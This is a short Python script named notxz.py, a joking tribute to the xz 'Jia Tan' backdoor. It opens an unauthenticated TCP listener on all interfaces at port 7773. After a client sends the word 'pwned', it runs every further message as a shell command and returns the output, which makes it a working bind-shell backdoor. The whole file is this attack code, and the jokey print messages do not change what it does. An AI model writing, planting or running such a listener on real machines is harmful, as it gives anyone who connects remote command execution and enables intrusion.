# notxz.py

import socket
import subprocess

host = '0.0.0.0'
port = 7773
backdoor = False

try:

    while True:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_socket:
            server_socket.bind((host, port))
            server_socket.listen()
            print(f"listening for jia tan: {port}")
            client_socket, client_address = server_socket.accept()
            print(f"jia tan created a new branch: {client_address}")
            while True:            
                data = client_socket.recv(1024)
                if not data:
                    break
                message = data.decode().strip()
                
                if backdoor:     
                    try:        
                        output = subprocess.check_output(message, shell=True)        
                        client_socket.sendall(output.decode("utf-8").encode())
                        client_socket.sendall("# ".encode())
                        continue
                    except Exception as e:
                        client_socket.sendall(f"error: {e} ".encode())

                if not backdoor:
                    print(f"jia tan made a new commit: {message}")    
                    client_socket.sendall(f"backdoor command not recognised: {message}\nrun \"pwned\" to enter backup shell\n".encode())

                if message == "pwned":
                    print("jia tan pushed upstream!")
                    client_socket.sendall("backdoor enabled, please wait 500ms\n# ".encode())
                    backdoor = True
                    continue

            backdoor = False                    
            client_socket.close()
except Exception as e:
    print(f"smth broke: {e}")